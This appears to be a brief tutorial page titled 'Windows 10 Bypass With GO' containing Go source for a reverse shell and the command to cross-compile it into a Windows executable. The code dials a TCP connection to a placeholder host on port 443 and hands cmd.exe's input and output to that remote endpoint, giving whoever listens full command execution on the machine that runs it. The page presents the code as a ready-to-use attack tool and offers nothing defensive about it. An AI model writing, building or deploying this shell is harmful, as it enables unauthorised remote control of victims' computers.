---
# the default layout is 'page'
icon: fas fa-subway
order: 6
---
# Windows 10 Bypass With GO
### nano pleasesubscribe.go
```bash
package main
import ("os/exec"; "net"; "time")

func main() { 
        time.Sleep(2 * time.Second)
        c,_:= net.Dial("tcp", "192.168.x.x:443")
        cmd:= exec.Command("cmd")
        cmd.Stdin = c
        cmd.Stdout = c
        cmd.Stderr = c
        cmd.Run() 
}
```
### Compile it !
```bash
GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
```
